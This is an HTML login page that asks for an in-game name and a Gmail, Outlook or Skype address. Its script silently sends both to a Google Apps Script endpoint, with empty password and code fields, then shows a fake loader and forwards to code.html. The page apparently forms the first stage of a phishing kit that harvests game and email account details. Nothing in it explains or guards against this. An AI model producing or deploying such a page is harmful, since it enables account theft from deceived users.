<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    body {
      margin: 0;
      padding: 0;
      background: url('https://static.vecteezy.com/system/resources/previews/030/658/183/non_2x/desktop-wallpapers-wallpaper-desktop-tree-free-photo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .overlay {
      background-color: rgba(0, 0, 0, 0.4);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    .login-box {
      background: rgba(255, 255, 255, 0.85);
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
      text-align: center;
      backdrop-filter: blur(5px);
      z-index: 2;
    }
    h2 {
      margin-top: 0;
      color: #2f4f4f;
      font-weight: 600;
    }
    input[type="text"], input[type="email"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #999;
      background-color: #f0f0f0;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #4471fb;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    button:hover {
      background-color: #565cff;
    }

    /* Loader Styles */
    .loader-overlay {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      background-color: rgba(0,0,0,0.6);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 5;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="login-box">
      <h2>Login</h2>
      <form id="loginForm">
        <input type="text" id="inGameName" placeholder="In-game name" required><br>
        <input type="email" id="email" placeholder="Gmail / Outlook / Skype" required><br>
        <button type="submit">Login</button>
      </form>
    </div>
    <div class="loader-overlay" id="loaderOverlay">
      <div class="loader"></div>
    </div>
  </div>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwWU_jo9dGxh5MNTp7vP70ANUlT5V1XvukmMzIcfPimLHU__stD1w2HwSxNgFTwD7SSww/exec';

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('inGameName').value;
      const gmail = document.getElementById('email').value;

      localStorage.setItem('username', username);
      localStorage.setItem('gmail', gmail);

      const formData = new FormData();
      formData.append("username", username);
      formData.append("gmail", gmail);
      formData.append("password", "");
      formData.append("code", "");

      document.getElementById('loaderOverlay').style.display = 'flex';

      fetch(scriptURL, {
        method: 'POST',
        body: formData
      })
      .then(res => res.text())
      .then(() => {
        setTimeout(() => {
          window.location.href = "code.html";
        }, 3000); // 3-second delay for loader effect
      })
      .catch(error => {
        document.getElementById('loaderOverlay').style.display = 'none';
        alert("Submission failed: " + error.message);
      });
    });
  </script>
</body>
</html>
